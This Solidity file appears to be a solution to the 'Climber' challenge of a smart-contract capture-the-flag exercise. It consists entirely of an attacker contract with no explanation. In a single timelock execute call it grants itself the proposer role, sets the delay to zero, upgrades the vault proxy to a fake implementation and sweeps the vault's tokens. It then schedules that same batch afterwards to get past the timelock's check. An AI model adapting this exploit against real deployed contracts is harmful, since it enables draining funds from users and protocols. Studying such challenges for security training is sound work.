// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "./FakeClimberVault.sol";
contract ClimberAttacker {
	ClimberTimelock timelock;
	ClimberVault vault;
	address[] _target = new address[](5);
	uint256[] _values = new uint256[](5);
	bytes[] _data = new bytes[](5);
	bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
	constructor (ClimberTimelock _timelock, ClimberVault _vault) {
		timelock = _timelock;
		vault = _vault;
	}
	function attack(address token) external{
		//here deploy a modified vault
		address fakeVault = address(new FakeClimberVault());
		// 


		address[] storage target = _target;
		target[0] = address(timelock);
		target[1] = address(timelock);
		target[2] = address(vault);
		target[3] =  address(vault);
		target[4] =  address(this);

		uint256[] storage values = _values;

		_data[0] = abi.encodeWithSelector(0x2f2ff15d, PROPOSER_ROLE, address(this));
		_data[1] = abi.encodeWithSelector(0x24adbc5b, 0);//updateDelay
		_data[2] = abi.encodeWithSelector(0x3659cfe6, fakeVault);//upgradeTo 
		_data[3] = abi.encodeWithSelector(0x0fe28908, token);//sweepFunds
		_data[4] = abi.encodeWithSelector(0x960bf6c5);//callSchedule
		timelock.execute(target, values, _data, "");
	}

	function callSchedule() external{
		timelock.schedule(
			_target,
			_values,
			_data,
			""
		);
	}

}